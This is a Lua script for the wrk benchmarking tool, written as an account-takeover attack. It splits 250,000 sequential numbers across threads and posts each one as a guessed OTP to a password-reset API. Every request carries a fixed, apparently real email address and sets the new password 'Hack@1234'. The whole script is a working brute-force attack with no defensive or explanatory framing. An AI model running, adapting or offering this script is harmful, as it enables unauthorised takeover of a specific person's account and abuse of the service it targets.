local MACHINE_BASE = tonumber(os.getenv("MACHINE_BASE")) or 0
local THREADS_COUNT = 2 -- Aligned to 2-vCPU hardware
local MACHINE_QUOTA = 250000
local thread_quota = MACHINE_QUOTA / THREADS_COUNT

local thread_indexer = 0

function setup(thread)
    thread_indexer = thread_indexer + 1
    thread:set("id", thread_indexer)
end

local my_requests_sent = 0
local my_base_id = 0
local flight_queue = {} -- Async FIFO tracking block

function init(args)
    local my_thread_id = wrk.thread:get("id")
    my_base_id = MACHINE_BASE + (my_thread_id - 1) * thread_quota
end

request = function()
    my_requests_sent = my_requests_sent + 1

    -- Standard boundary check ensures the final quota request fires
    if my_requests_sent > thread_quota then
        wrk.thread:stop()
        return nil
    end

    local unique_user_id = my_base_id + my_requests_sent
    table.insert(flight_queue, unique_user_id)

    local headers = {}
    headers["Content-Type"] = "application/json"

    -- Optimized Raw Integer compilation
    local body = '{"email": "harshpoonia231199@acropolis.in","otp": ' .. unique_user_id .. ',"newPassword": "Hack@1234"}'

    -- Insert your private hidden URL path route here
    return wrk.format("POST", "/api/auth/reset-password", headers, body)
end